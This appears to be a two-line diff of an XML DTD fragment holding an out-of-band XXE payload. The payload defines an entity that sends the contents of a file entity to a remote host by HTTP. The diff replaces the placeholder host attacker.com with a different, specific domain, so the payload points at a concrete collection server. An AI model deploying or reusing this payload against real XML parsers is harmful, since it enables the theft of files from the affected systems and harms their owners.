@@ -1,2 +1,2 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://%file.attacker.com/;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://%file.kshitnuck.com/;'>">
 %all;
